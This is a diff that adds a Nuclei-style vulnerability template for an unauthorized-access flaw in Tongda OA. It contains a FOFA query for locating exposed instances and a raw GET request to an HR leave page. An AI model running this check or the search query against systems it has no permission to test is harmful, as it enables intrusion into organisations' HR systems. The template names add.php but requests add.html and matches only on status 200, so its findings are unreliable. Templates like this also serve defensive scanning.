@@ -1,0 +1,33 @@
+id: poc-zh8sguqqpq13czr6
+info:
+  name: 通达OA前台add.php存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zh8sguqqpq13czr6'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zh8sguqqpq13czr6
+    fofa: app="TDXK-通达OA" && icon_hash="-759108386"
+http:
+- raw:
+  - 'GET /general/hr/setting/attendance/newLeave/add.html HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
